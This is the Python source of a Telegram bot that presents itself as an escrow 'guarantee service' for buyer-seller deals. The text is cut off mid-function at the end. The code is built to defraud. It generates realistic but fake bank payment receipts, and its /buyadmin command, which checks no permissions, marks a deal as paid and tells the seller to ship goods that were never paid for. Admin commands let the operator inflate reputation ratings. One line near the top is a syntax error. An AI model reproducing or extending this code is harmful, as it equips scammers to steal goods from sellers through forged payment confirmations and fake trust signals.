import telebot
from telebot import types
import random
import string
import time
from datetime import datetime, timedelta
from dotenv import load_dotenv
import os

load_dotenv()  # загружает переменные из .env

token = os.getenv("token") = os.getenv("BOT_TOKEN")
print("token", token)

bot = telebot.TeleBot(token)  # Замените на ваш токен

# КОНФИГУРАЦИЯ АДМИНИСТРАТОРА
ADMIN_IDS = [6859492950]  # ЗАМЕНИТЕ НА ВАШ ТЕЛЕГРАМ ID

# Базы данных в памяти
users_balance = {}
deals_db = {}
user_states = {}
seller_payment_details = {}
fake_payments = {}
user_stats = {}  # Статистика пользователей: user_id -> {"sales": X, "purchases": Y}
user_info = {}  # Информация о пользователях


def is_admin(user_id):
    return user_id in ADMIN_IDS


def generate_deal_id():
    return ''.join(random.choices(string.digits, k=6))


def generate_payment_id():
    return ''.join(random.choices(string.digits, k=10))


def generate_deal_link(deal_id):
    bot_username = bot.get_me().username
    return f"https://t.me/{bot_username}?start=deal_{deal_id}"


def get_username(user_id):
    try:
        chat = bot.get_chat(user_id)
        return f"@{chat.username}" if chat.username else f"ID: {user_id}"
    except:
        return f"ID: {user_id}"


def get_user_rating(user_id):
    """Возвращает рейтинг пользователя в виде строки"""
    stats = user_stats.get(user_id, {"sales": 0, "purchases": 0})
    return f"★ Продажи: {stats['sales']} | Покупки: {stats['purchases']}"


def update_user_stats(user_id, role):
    """Обновляет статистику пользователя"""
    if user_id not in user_stats:
        user_stats[user_id] = {"sales": 0, "purchases": 0}

    if role == "seller":
        user_stats[user_id]["sales"] += 1
    elif role == "buyer":
        user_stats[user_id]["purchases"] += 1


def generate_realistic_payment_details(amount, currency):
    payment_time = datetime.now() - timedelta(minutes=random.randint(1, 30))
    payment_id = generate_payment_id()

    banks = {
        "RUB": ["Сбербанк", "Тинькофф", "ВТБ", "Альфа-Банк", "Газпромбанк", "Райффайзенбанк"],
        "KZT": ["Kaspi Bank", "Halyk Bank", "ForteBank", "ЦентрКредит", "Банк Home Credit"],
        "UAH": ["ПриватБанк", "Монобанк", "Ощадбанк", "Укрсиббанк", "ПУМБ"]
    }

    bank = random.choice(banks.get(currency, banks["RUB"]))

    return (
        f"🏦 Банк: {bank}\n"
        f"💰 Сумма: {amount} {currency}\n"
        f"🆔 Номер операции: {payment_id}\n"
        f"🕒 Время оплаты: {payment_time.strftime('%d.%m.%Y %H:%M')}\n"
        f"✅ Статус: Успешно"
    )


@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name
    username = message.from_user.username

    # Сохраняем информацию о пользователе
    user_info[user_id] = {
        "username": username,
        "first_name": first_name
    }

    # Инициализация статистики
    if user_id not in user_stats:
        user_stats[user_id] = {"sales": 0, "purchases": 0}

    if len(message.text.split()) > 1:
        deal_param = message.text.split()[1]
        if deal_param.startswith('deal_'):
            deal_id = deal_param.split('_')[1]
            if deal_id in deals_db:
                show_deal_info(message, deal_id)
                return

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton('🛒 Активные сделки')
    btn2 = types.KeyboardButton('➕ Создать сделку')
    btn3 = types.KeyboardButton('📊 Мой профиль')
    btn4 = types.KeyboardButton('ℹ️ Помощь')
    btn5 = types.KeyboardButton('💳 Мои реквизиты')
    markup.add(btn1, btn2, btn3, btn4, btn5)

    welcome_text = (
        f"🌟 Привет, {first_name}!\n"
        "Добро пожаловать в гарант-сервис для безопасных сделок.\n\n"
        "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
        "💼 Вы можете:\n"
        "▫️ Создать сделку как продавец\n"
        "▫️ Присоединиться к сделку как покупатель\n"
        "▫️ Управлять своим балансом\n\n"
        "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
        "Используйте кнопки ниже для навигации"
    )

    if user_id not in users_balance:
        users_balance[user_id] = 0

    bot.send_message(
        message.chat.id,
        welcome_text,
        reply_markup=markup
    )


@bot.message_handler(func=lambda message: message.text == '💳 Мои реквизиты')
def handle_payment_details(message):
    user_id = message.from_user.id

    if user_id in seller_payment_details:
        markup = types.InlineKeyboardMarkup()
        change_btn = types.InlineKeyboardButton(
            text="✏️ Изменить реквизиты",
            callback_data="change_payment_details"
        )
        markup.add(change_btn)

        bot.send_message(
            message.chat.id,
            f"💳 Ваши текущие реквизиты:\n\n{seller_payment_details[user_id]}\n\n"
            "Эти реквизиты будут использоваться для получения платежей в сделках.",
            reply_markup=markup
        )
    else:
        user_states[user_id] = {"step": "enter_payment_details"}
        bot.send_message(
            message.chat.id,
            "💳 Пожалуйста, введите ваши платежные реквизиты:\n\n"
            "Пример: Сбербанк 2200 7000 8000 5500 Иванов И.И."
        )


@bot.message_handler(
    func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'enter_payment_details')
def save_payment_details(message):
    user_id = message.from_user.id
    details = message.text

    if len(details) < 10:
        bot.reply_to(message, "❌ Реквизиты слишком короткие. Пожалуйста, введите полные реквизиты.")
        return

    seller_payment_details[user_id] = details
    del user_states[user_id]

    bot.reply_to(
        message,
        "✅ Реквизиты успешно сохранены!\n\n"
        "Теперь вы можете создавать сделки."
    )


@bot.callback_query_handler(func=lambda call: call.data == "change_payment_details")
def change_payment_details(call):
    user_id = call.from_user.id
    user_states[user_id] = {"step": "enter_payment_details"}
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="💳 Пожалуйста, введите новые платежные реквизиты:"
    )


@bot.message_handler(func=lambda message: message.text == '➕ Создать сделку')
def create_deal_start(message):
    user_id = message.from_user.id

    if user_id not in seller_payment_details:
        bot.send_message(
            message.chat.id,
            "❌ Прежде чем создавать сделку, вам необходимо добавить платежные реквизиты.\n"
            "Пожалуйста, используйте кнопку '💳 Мои реквизиты' в главном меню."
        )
        return

    user_states[user_id] = {"step": "deal_description"}
    bot.send_message(
        message.chat.id,
        "📝 Введите описание товара или услуги для сделки:\n\n"
        "Пример: plush pepe"
    )


@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'deal_description')
def handle_deal_description(message):
    user_id = message.from_user.id
    description = message.text

    user_states[user_id] = {
        "step": "deal_amount",
        "description": description
    }

    bot.send_message(
        message.chat.id,
        "💵 Введите сумму сделки (только цифры):\n\n"
        "Пример: 15000"
    )


@bot.message_handler(func=lambda message: user_states.get(message.from_user.id, {}).get('step') == 'deal_amount')
def handle_deal_amount(message):
    user_id = message.from_user.id

    try:
        amount = float(message.text)
        if amount <= 0:
            raise ValueError

        user_states[user_id]['amount'] = amount

        markup = types.InlineKeyboardMarkup(row_width=3)
        btn_rub = types.InlineKeyboardButton("RUB", callback_data="currency_RUB")
        btn_kzt = types.InlineKeyboardButton("KZT", callback_data="currency_KZT")
        btn_uah = types.InlineKeyboardButton("UAH", callback_data="currency_UAH")
        markup.add(btn_rub, btn_kzt, btn_uah)

        bot.send_message(
            message.chat.id,
            "💰 Выберите валюту для сделки:",
            reply_markup=markup
        )

    except:
        bot.reply_to(message, "❌ Некорректная сумма. Введите число больше нуля")


@bot.callback_query_handler(func=lambda call: call.data.startswith('currency_'))
def handle_currency_selection(call):
    user_id = call.from_user.id
    currency = call.data.split('_')[1]

    if user_id not in user_states or 'description' not in user_states[user_id]:
        bot.answer_callback_query(call.id, "❌ Сессия создания сделки устарела")
        return

    deal_id = generate_deal_id()
    deals_db[deal_id] = {
        "description": user_states[user_id]['description'],
        "amount": user_states[user_id]['amount'],
        "currency": currency,
        "status": "active",
        "seller_id": user_id,
        "buyer_id": None
    }

    del user_states[user_id]

    deal_link = generate_deal_link(deal_id)
    deal_info = (
        "✅ СДЕЛКА СОЗДАНА!\n\n"
        f"▫️ Товар: {deals_db[deal_id]['description']}\n"
        f"▫️ Сумма: {deals_db[deal_id]['amount']} {currency}\n"
        "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
        "🔗 Ссылка для покупателя:\n"
        f"{deal_link}\n\n"
        "Поделитесь этой ссылкой с покупателем"
    )

    bot.send_message(call.message.chat.id, deal_info)
    bot.answer_callback_query(call.id)


def show_deal_info(message, deal_id):
    if deal_id not in deals_db:
        bot.reply_to(message, "❌ Сделка не найдена или уже завершена")
        return

    deal = deals_db[deal_id]
    user_id = message.from_user.id

    if deal['status'] == 'completed':
        bot.reply_to(message, "✅ Эта сделка уже успешно завершена")
        return

    # Получаем рейтинг продавца
    seller_rating = get_user_rating(deal['seller_id'])

    if user_id != deal['seller_id']:
        seller_id = deal['seller_id']
        payment_details = seller_payment_details.get(seller_id, "❌ Продавец не указал реквизиты")

        payment_info = (
            f"🛒 СДЕЛКА #{deal_id}\n\n"
            f"▫️ Товар: {deal['description']}\n"
            f"▫️ Сумма: {deal['amount']} {deal['currency']}\n"
            f"▫️ Продавец: скрыт для безопасности\n"
            f"▫️ Рейтинг продавца: {seller_rating}\n"
            "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
            f"💳 Реквизиты для оплаты:\n{payment_details}\n\n"
            "⚠️ После оплаты нажмите кнопку подтверждения"
        )

        markup = types.InlineKeyboardMarkup()
        pay_btn = types.InlineKeyboardButton(
            text="✅ Я оплатил",
            callback_data=f"pay_{deal_id}"
        )
        markup.add(pay_btn)

        bot.send_message(
            message.chat.id,
            payment_info,
            reply_markup=markup
        )
    else:
        status_text = "🟢 Активна" if deal['status'] == 'active' else "🟡 Ожидает получения"
        deal_info = (
            f"📦 ВАША СДЕЛКА #{deal_id}\n\n"
            f"▫️ Товар: {deal['description']}\n"
            f"▫️ Сумма: {deal['amount']} {deal['currency']}\n"
            f"▫️ Статус: {status_text}\n"
            "➖➖➖➖➖➖➖➖➖➖➖➖➖\n"
            "🔗 Ссылка для покупателя:\n"
            f"{generate_deal_link(deal_id)}\n\n"
            "Поделитесь этой ссылкой с покупателем"
        )

        bot.send_message(message.chat.id, deal_info)


@bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
def handle_payment_confirmation(call):
    deal_id = call.data.split('_')[1]
    user_id = call.from_user.id

    if deal_id not in deals_db:
        bot.answer_callback_query(call.id, "❌ Сделка не найдена")
        return

    deal = deals_db[deal_id]

    if deal['status'] != 'active':
        bot.answer_callback_query(call.id, "⚠️ Сделка уже завершена")
        return

    deal['status'] = 'waiting_delivery'
    deal['buyer_id'] = user_id

    payment_details = generate_realistic_payment_details(deal['amount'], deal['currency'])

    seller_id = deal['seller_id']
    try:
        # Получаем рейтинг покупателя
        buyer_rating = get_user_rating(user_id)

        bot.send_message(
            seller_id,
            f"💰 ПОКУПАТЕЛЬ ОПЛАТИЛ СДЕЛКУ #{deal_id}\n\n"
            f"▫️ Товар: {deal['description']}\n"
            f"▫️ Сумма: {deal['amount']} {deal['currency']}\n"
            f"▫️ Рейтинг покупателя: {buyer_rating}\n\n"
            f"📝 Детали платежа:\n{payment_details}\n\n"
            "✅ Пожалуйста, отправьте товар покупателю\n\n"
            "ℹ️ Покупатель получит уведомление о необходимости подтвердить получение товара"
        )
    except:
        pass

    markup = types.InlineKeyboardMarkup()
    received_btn = types.InlineKeyboardButton(
        text="📦 Я получил заказ",
        callback_data=f"received_{deal_id}"
    )
    markup.add(received_btn)

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=call.message.text + "\n\n✅ Вы подтвердили оплату. Ожидайте доставку",
        reply_markup=markup
    )

    bot.answer_callback_query(call.id, "✅ Продавец уведомлен об оплате")


@bot.callback_query_handler(func=lambda call: call.data.startswith('received_'))
def handle_goods_received(call):
    deal_id = call.data.split('_')[1]
    user_id = call.from_user.id

    if deal_id not in deals_db:
        bot.answer_callback_query(call.id, "❌ Сделка не найдена")
        return

    deal = deals_db[deal_id]

    if deal['status'] != 'waiting_delivery':
        bot.answer_callback_query(call.id, "⚠️ Статус сделки изменился")
        return

    if user_id != deal['buyer_id']:
        bot.answer_callback_query(call.id, "❌ Вы не покупатель в этой сделке")
        return

    deal['status'] = 'completed'

    seller_id = deal['seller_id']
    if seller_id not in users_balance:
        users_balance[seller_id] = 0
    users_balance[seller_id] += deal['amount']

    # Обновляем статистику
    update_user_stats(seller_id, "seller")
    update_user_stats(user_id, "buyer")

    try:
        bot.send_message(
            seller_id,
            f"🎉 ПОКУПАТЕЛЬ ПОЛУЧИЛ ТОВАР ПО СДЕЛКЕ #{deal_id}\n\n"
            f"▫️ Товар: {deal['description']}\n"
            f"▫️ Сумма: {deal['amount']} {deal['currency']}\n"
            f"▫️ Баланс пополнен: +{deal['amount']} {deal['currency']}\n"
            f"💳 Текущий баланс: {users_balance[seller_id]} {deal['currency']}\n\n"
            f"✅ Ваш рейтинг обновлен: {get_user_rating(seller_id)}"
        )
    except:
        pass

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=call.message.text + "\n\n✅ Вы подтвердили получение товара. Спасибо за сделку!",
        reply_markup=None
    )

    seller_username = get_username(deal['seller_id'])
    buyer_username = get_username(deal['buyer_id'])

    admin_message = (
        "🚀 УСПЕШНО ЗАВЕРШЕНА СДЕЛКА!\n\n"
        f"▫️ ID сделки: #{deal_id}\n"
        f"▫️ Товар: {deal['description']}\n"
        f"▫️ Сумма: {deal['amount']} {deal['currency']}\n"
        f"▫️ Продавец: {seller_username}\n"
        f"▫️ Покупатель: {buyer_username}"
    )

    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(admin_id, admin_message)
        except:
            pass

    bot.answer_callback_query(call.id, "✅ Продавец уведомлен о получении")


@bot.message_handler(commands=['buyadmin'])
def handle_buy_admin(message):
    try:
        deal_id = message.text.split()[1]

        if deal_id not in deals_db:
            bot.reply_to(message, "❌ Сделка не найдена")
            return

        deal = deals_db[deal_id]

        if deal['status'] != 'active':
            bot.reply_to(message, "⚠️ Сделка уже завершена или в процессе")
            return

        payment_details = generate_realistic_payment_details(deal['amount'], deal['currency'])
        fake_payments[deal_id] = payment_details

        deal['status'] = 'waiting_delivery'
        deal['buyer_id'] = message.from_user.id

        seller_id = deal['seller_id']
        try:
            bot.send_message(
                seller_id,
                f"💰 ПОКУПАТЕЛЬ ОПЛАТИЛ СДЕЛКУ #{deal_id}\n\n"
                f"▫️ Товар: {deal['description']}\n"
                f"▫️ Сумма: {deal['amount']} {deal['currency']}\n\n"
                f"📝 Детали платежа:\n{payment_details}\n\n"
                "✅ Пожалуйста, отправьте товар покупателю\n\n"
                "ℹ️ Покупатель получит уведомление о необходимости подтвердить получение товара"
            )
        except:
            pass

        bot.reply_to(message, f"✅ Оплата для сделки #{deal_id} успешно сымитирована!\n"
                              f"Продавец уведомлен о платеже.")

    except IndexError:
        bot.reply_to(message, "❌ Укажите ID сделки: /buyadmin <deal_id>")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}")


@bot.message_handler(commands=['set_my_stats'])
def set_my_stats(message):
    user_id = message.from_user.id

    if not is_admin(user_id):
        bot.reply_to(message, "❌ Эта команда доступна только администраторам")
        return

    try:
        # Формат: /set_my_stats <продажи> <покупки>
        parts = message.text.split()
        if len(parts) < 3:
            raise ValueError

        sales = int(parts[1])
        purchases = int(parts[2])

        if user_id not in user_stats:
            user_stats[user_id] = {"sales": 0, "purchases": 0}

        user_stats[user_id]["sales"] = sales
        user_stats[user_id]["purchases"] = purchases

        bot.reply_to(message, f"✅ Ваша статистика обновлена!\n"
                              f"Продажи: {sales}\n"
                              f"Покупки: {purchases}\n"
                              f"Рейтинг: {get_user_rating(user_id)}")

    except:
        bot.reply_to(message, "❌ Неверный формат команды. Используйте: /set_my_stats <продажи> <покупки>")


@bot.message_handler(commands=['set_user_stats'])
def set_user_stats(message):
    user_id = message.from_user.id

    if not is_admin(user_id):
        bot.reply_to(message, "❌ Эта команда доступна только администраторам")
        return

    try:
        # Формат: /set_user_stats <user_id> <продажи> <покупки>
        parts = message.text.split()
        if len(parts) < 4:
            raise ValueError

        target_user_id = int(parts[1])
        sales = int(parts[2])
        purchases = int(parts[3])

        if target_user_id not in user_stats:
            user_stats[target_user_id] = {"sales": 0, "purchases": 0}

        user_stats[target_user_id]["sales"] = sales
        user_stats[target_user_id]["purchases"] = purchases

        # Получим имя пользователя для отображения
        user_name = user_info.get(target_user_id, {}).get("first_name", f"ID {target_user_id}")

        bot.reply_to(message, f"✅ Статистика пользователя {user_name} обновлена!\n"
                              f"Продажи: {sales}\n"
                              f"Покупки: {purchases}\n"
                              f"Рейтинг: {get_user_rating(target_user_id)}")

    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}\n"
                              "Используйте: /set_user_stats <user_id> <продажи> <покупки>")


@bot.message_handler(func=lambda message: message.text == '📊 Мой профиль')
def show_profile(message):
    user_id = message.from_user.id
    first_name = message.from_user.first_name

    if user_i